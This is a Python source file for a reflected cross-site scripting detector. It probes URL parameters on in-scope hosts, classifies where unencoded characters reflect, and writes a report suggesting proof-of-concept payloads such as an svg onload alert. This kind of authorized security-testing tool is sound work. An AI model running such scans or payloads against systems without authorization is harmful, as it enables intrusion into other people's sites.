#!/usr/bin/env python3
"""
xss_reflected.py: reflected-XSS reflection & context detector.

For each parameter it injects a unique marker, checks whether it reflects in the
response, and then which breakout characters (< > " ' ` =) survive UNENCODED and
in what context (HTML body / attribute / script / JS string). Unencoded breakout
chars in an executable context = a strong reflected-XSS lead.

This DETECTS reflection and un-sanitized context. It does NOT fire real payloads
or confirm execution — that is a manual step in a browser (the payload is in the
report). ONLY run against authorized targets; scope enforced via --scope.

Standalone:
  python3 xss_reflected.py -d "*.target.com" --scope scope.txt
  python3 xss_reflected.py --params-file params.txt --scope scope.txt
Also runs as the `xss` module in hunt.py.
"""
import argparse
import json
import re
import sys
import time
import types
import uuid
from pathlib import Path
from urllib.parse import urlparse, parse_qsl

import requests

import crlf_hunt as core

UA = "Mozilla/5.0 (xss-reflect; authorized testing)"
BREAKOUTS = ["<", ">", '"', "'", "`"]


def log(m):
    print(m, flush=True)


def inject(url, name, payload):
    pat = re.compile(r"([?&]" + re.escape(name) + r"=)[^&#]*")
    return pat.sub(lambda m: m.group(1) + payload, url, count=1)


def classify_context(body, token):
    """Where does the token land? Decides how dangerous unencoded chars are."""
    i = body.find(token)
    if i < 0:
        return None
    before = body[max(0, i - 120):i].lower()
    after = body[i + len(token):i + len(token) + 40].lower()
    last_script = before.rfind("<script")
    last_script_close = before.rfind("</script")
    if last_script > last_script_close:
        return "script"           # inside <script> ... </script>
    if re.search(r'=\s*["\'][^"\']*$', before):
        return "attribute"        # inside an HTML attribute value
    if before.rfind("<") > before.rfind(">"):
        return "tag"              # inside a tag (between < and >)
    return "html"                 # ordinary HTML body text


def analyze_param(session, url, name, delay):
    time.sleep(delay)
    token = "xq" + uuid.uuid4().hex[:8]
    probe_val = f"{token}<x>\"'`=/{token}"
    try:
        r = session.get(inject(url, name, probe_val), timeout=10)
    except requests.RequestException:
        return None
    body = r.text or ""
    if token not in body:
        return None  # not reflected
    # Examine ONLY the text the app put BETWEEN our two token markers — that is the
    # reflected payload itself (<x>"'`=/), so the surrounding HTML (e.g. a content="
    # attribute delimiter) can't masquerade as an un-encoded breakout char.
    i1 = body.find(token)
    i2 = body.find(token, i1 + len(token))
    if i2 < 0:
        return None  # only one marker reflected (truncated/normalized) — unreliable
    middle = body[i1 + len(token):i2]
    # URL-encoded reflection (%22 %3C ...) = safe; skip the whole og:url / error-page class
    if "%22" in middle or "%3C" in middle or "%3c" in middle or "%27" in middle:
        return None
    unencoded = [c for c in BREAKOUTS if c in middle]
    if not unencoded:
        return None  # fully sanitized/encoded between markers
    ctx = classify_context(body, token)
    exploitable = (
        (ctx in ("html", "tag") and "<" in unencoded and ">" in unencoded) or
        (ctx == "attribute" and ('"' in unencoded or "'" in unencoded)) or
        (ctx == "script" and ('"' in unencoded or "'" in unencoded or "`" in unencoded))
    )
    return {
        "url": inject(url, name, probe_val), "param": name,
        "context": ctx, "unencoded": unencoded,
        "reflected": True, "likely_exploitable": exploitable,
        "status": r.status_code,
    }


def suggest_payload(ctx, unencoded):
    if ctx in ("html", "tag"):
        return "<svg/onload=alert(document.domain)>"
    if ctx == "attribute":
        q = '"' if '"' in unencoded else "'"
        return f'{q}><svg/onload=alert(document.domain)>'
    if ctx == "script":
        q = "'" if "'" in unencoded else '"'
        return f"{q};alert(document.domain);//"
    return "<svg/onload=alert(document.domain)>"


def hunt(args, cands):
    s = requests.Session()
    s.headers["User-Agent"] = UA
    findings, tests = [], 0
    for url in cands:
        names = {n for n, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)}
        for name in names:
            if tests >= args.max_tests:
                log("[!] max-tests reached")
                return findings
            tests += 1
            res = analyze_param(s, url, name, args.delay)
            if not res:
                continue
            res["suggested_payload"] = suggest_payload(res["context"], res["unencoded"])
            findings.append(res)
            tag = "likely-exploitable" if res["likely_exploitable"] else "reflected"
            log(f"[XSS {tag}] {name} @ {urlparse(url).hostname} "
                f"(ctx={res['context']}, unencoded={''.join(res['unencoded'])})")
            Path("findings_xss.json").write_text(json.dumps(findings, indent=2))
    log(f"[*] xss: {tests} params tested, {len(findings)} reflections")
    return findings


def write_report(findings, target):
    out = [f"# Reflected XSS leads — {target}", "",
           "> DRAFT. These are REFLECTIONS with un-sanitized context — NOT confirmed "
           "XSS. Confirm execution in a browser with the suggested payload before "
           "reporting. A reflection that HTML-encodes the breakout chars is safe.", ""]
    ex = [f for f in findings if f.get("likely_exploitable")]
    rest = [f for f in findings if not f.get("likely_exploitable")]
    out += [f"## Likely exploitable ({len(ex)})", ""]
    for i, f in enumerate(ex + rest, 1):
        host = urlparse(f["url"]).hostname
        out += [f"### {i}. {f['param']} @ {host}  "
                f"({'likely-exploitable' if f.get('likely_exploitable') else 'reflected'})",
                f"- context: **{f['context']}** · unencoded: `{''.join(f['unencoded'])}`",
                f"- suggested payload: `{f['suggested_payload']}`",
                "PoC (confirm in a browser, do not auto-fire):",
                "```",
                f"{f['url'].split('?')[0]}?{f['param']}={f['suggested_payload']}",
                "```", ""]
    Path("report_xss.md").write_text("\n".join(out))
    log("[*] -> report_xss.md, findings_xss.json")


def recon_args(args):
    return types.SimpleNamespace(
        url=args.url, domain=args.domain, oob_url=None,
        no_crawl=args.no_crawl, crawl_all=args.crawl_all,
        crawl_cap=args.crawl_cap, wayback_cap=args.wayback_cap)


def main():
    ap = argparse.ArgumentParser(description="Reflected-XSS reflection/context detector")
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("-d", "--domain")
    g.add_argument("-u", "--url")
    g.add_argument("--params-file", dest="params_file")
    ap.add_argument("--scope", required=True)
    ap.add_argument("--delay", type=float, default=0.5)
    ap.add_argument("--max-tests", type=int, default=5000)
    ap.add_argument("--no-crawl", action="store_true")
    ap.add_argument("--crawl-all", dest="crawl_all", action="store_true")
    ap.add_argument("--crawl-cap", dest="crawl_cap", type=int, default=60)
    ap.add_argument("--wayback-cap", dest="wayback_cap", type=int, default=400)
    args = ap.parse_args()

    scope = core.load_lines(args.scope)
    if args.params_file:
        cands = sorted({u for u in core.load_lines(args.params_file)
                        if "=" in urlparse(u).query and core.in_scope(urlparse(u).hostname, scope)})
    else:
        target = (args.domain or urlparse(args.url).hostname).lstrip("*.")
        if not core.in_scope(target, scope):
            sys.exit(f"[!] {target} not in scope")
        Path(f"xss_{target}").mkdir(exist_ok=True)
        import os
        os.chdir(f"xss_{target}")
        cands = core.recon(recon_args(args), scope)
    if not cands:
        sys.exit("[!] no parameterized URLs")
    findings = hunt(args, cands)
    tgt = args.domain or (urlparse(args.url).hostname if args.url else "target")
    write_report(findings, tgt)


if __name__ == "__main__":
    main()
